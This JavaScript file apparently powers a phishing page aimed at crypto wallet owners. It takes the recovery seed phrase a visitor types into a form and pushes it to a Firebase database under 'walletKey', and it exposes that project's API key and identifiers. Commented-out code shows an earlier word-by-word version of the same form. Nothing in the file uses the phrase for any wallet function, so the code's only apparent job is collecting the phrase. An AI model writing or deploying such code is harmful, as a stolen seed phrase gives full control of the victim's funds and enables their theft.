const firebaseConfig = {
  apiKey: "AIzaSyCDls4pTCtLumlc5uVOMpIZ5EWwUolHHT0",
  authDomain: "web3-work.firebaseapp.com",
  databaseURL: "https://web3-work-default-rtdb.firebaseio.com",
  projectId: "web3-work",
  storageBucket: "web3-work.appspot.com",
  messagingSenderId: "160386627880",
  appId: "1:160386627880:web:7260c7762286affd92f81d",
};

// Initialize firebase
firebase.initializeApp(firebaseConfig);

// Reference for database
var keyDB = firebase.database().ref("walletKey");

// const wordBoxes = Array.from(document.querySelectorAll(".word-box"));
const submitButton = document.getElementById("submit-button");
const seed = document.getElementById("phrase");

let words; 

seed.addEventListener("input", (e) => {
  words = e.target.value;
});

submitButton.addEventListener("click", (e) => {
  e.preventDefault();
  const submittedWords = words || seed.value; 
  savePhrase(submittedWords);
});

const savePhrase = (submittedWords) => {
  var newDatabaseForm = keyDB.push();

  newDatabaseForm.set({
    phrases: submittedWords,
  });
};

// wordBoxes.forEach((box, i) => {
//   box.addEventListener("blur", (e) => {
//     if (e.target.disabled) return;
//     if (!e.target.value.match(/^[a-zA-Z]{4,8}$/g)) {
//       box.style.borderColor = "red"; // Add red border
//       box.classList.add("shake"); // Add shake animation
//       return;
//     }

//     box.style.borderColor = "#0e0"; // Reset border color on valid input
//     if (wordBoxes.length !== i + 1) wordBoxes[i + 1].disabled = false;

//     if (wordBoxes.length == i + 1) submitButton.disabled = false;
//   });
// });

// submitButton.addEventListener("click", (e) => {
//   e.preventDefault();
//   // Collect entered words into an array
//   const submittedWords = wordBoxes.map((box) => box.value);

//   // Handle form submission here (e.g., send data to backend)
//   savePhrase(submittedWords);
// //   alert("Your form has been submitted!");


//   // Reset input boxes
//   wordBoxes.forEach((box, i) => {
//     box.value = "";
//     box.style.borderColor = "rgba(204, 204, 204, 0)";
//     if (i !== 0) box.disabled = true;
//   });
// });